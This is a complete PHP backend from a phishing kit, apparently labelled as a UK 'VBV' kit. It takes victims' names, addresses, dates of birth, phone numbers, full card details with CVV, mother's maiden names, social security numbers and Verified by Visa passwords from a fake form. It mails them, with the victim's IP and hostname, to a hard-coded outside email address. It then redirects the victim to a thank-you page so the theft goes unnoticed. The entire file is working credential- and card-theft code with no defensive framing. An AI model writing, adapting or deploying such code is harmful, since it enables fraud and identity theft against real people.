<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "+--------------- Credit Card InformationS -----------+\n";
$message .= "+---------------------- By zebii CC ------------+\n";
$message .= "First Name        : ".$_POST['racho1']."\n";
$message .= "Last Name         : ".$_POST['racho2']."\n";
$message .= "date of birth day : ".$_POST['racho3']."/".$_POST['racho4']."/".$_POST['racho5']."\n";
$message .= "Adress Line 1     : ".$_POST['racho6']."\n";
$message .= "Adress Line 2     : ".$_POST['racho7']."\n";
$message .= "City              : ".$_POST['racho8']."\n";
$message .= "Country           : ".$_POST['racho9']."\n";
$message .= "Zip Code          : ".$_POST['racho10']."\n";
$message .= "telephone         : ".$_POST['racho11']."\n";
$message .= "+-------------------+ info vbv by Yasser +--------------------+\n";

$message .= "Name cardholder   : ".$_POST['racho12']."\n";
$message .= "card number       : ".$_POST['racho13']."\n";
$message .= "Expiration date   : ".$_POST['racho15']." / ".$_POST['racho16']."\n";
$message .= "Card Verification Number : ".$_POST['racho14']."\n";
$message .= "Mother Name           : ".$_POST['racho17']."\n";
$message .= "Social nummbers   : ".$_POST['racho18']."\n";
$message .= "Password vbv      : ".$_POST['racho21']."\n";
$message .= "+-------------[ Created By Yasser CC ]--------------------+\n";
$message .= "Client IP         : ".$ip."\n";
$message .= "HostName          : ".$hostname."\n";
$message .= "+-------------------+ By Yasser cc +--------------------+\n";

$send = "Salmane-Segame@live.Fr";
$subject = "$ip | UK VBV RESULT";
$headers = "From: UK <xzx@live.fr>"; 

mail("$send", "$subject", $message, $headers);   
?>

<?php
echo '<script language="Javascript">
<!--
document.location.replace("thxPage.htm");
// -->
</script>';
?>


